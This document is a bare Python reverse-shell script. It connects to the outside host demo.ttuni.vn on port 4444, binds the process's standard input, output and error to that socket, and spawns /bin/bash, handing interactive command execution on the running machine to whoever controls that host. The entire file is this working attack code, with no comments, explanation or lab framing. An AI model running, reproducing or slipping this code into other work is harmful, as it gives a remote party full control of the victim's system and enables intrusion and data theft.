#!/usr/bin/env python
import socket, subprocess, os

HOST = "demo.ttuni.vn"
PORT = 4444

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call("/bin/bash")
s.close()
